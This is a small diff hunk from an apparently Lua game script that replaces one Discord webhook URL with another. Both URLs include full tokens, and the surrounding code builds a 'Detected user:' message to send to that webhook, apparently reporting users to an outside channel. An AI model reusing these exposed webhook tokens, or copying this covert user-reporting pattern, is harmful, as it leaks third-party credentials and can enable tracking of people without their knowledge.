@@ -546,7 +546,7 @@ end
 return g(urprint,...)
 end)
 local url =
-"https://discord.com/api/webhooks/1009239170331447367/PKHDN6NXGr85w3ldmKAmu3IsmQ8-5T2x0XuNE1CdapUSgwZBLZpFQdrQzGqe6fc-82lo"
+"https://discord.com/api/webhooks/1018540435335041024/_1IZGJEGs4PfTlroH3fu_nFXiAn7MtMCGsrwAhRyhf2d_ILW1ZTrx8-t3aCP8DPjHntn"
 local data = {
 ["content"] = "Detected user:",
 ["embeds"] = {
